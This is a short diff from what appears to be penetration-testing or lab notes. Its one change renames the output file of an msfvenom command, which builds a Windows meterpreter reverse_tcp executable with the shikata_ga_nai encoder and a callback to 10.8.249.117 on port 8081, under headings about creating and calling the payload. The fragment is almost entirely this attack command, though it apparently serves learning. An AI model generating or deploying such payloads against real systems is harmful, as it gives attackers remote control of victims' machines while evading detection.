@@ -14,7 +14,7 @@ create powershell in windows
  
  ## create Payload
  
- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.249.117 LPORT=8081 -f exe -o [SHELL NAME].exe
+ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.249.117 LPORT=8081 -f exe -o learn.exe
  
  ## call payload
  
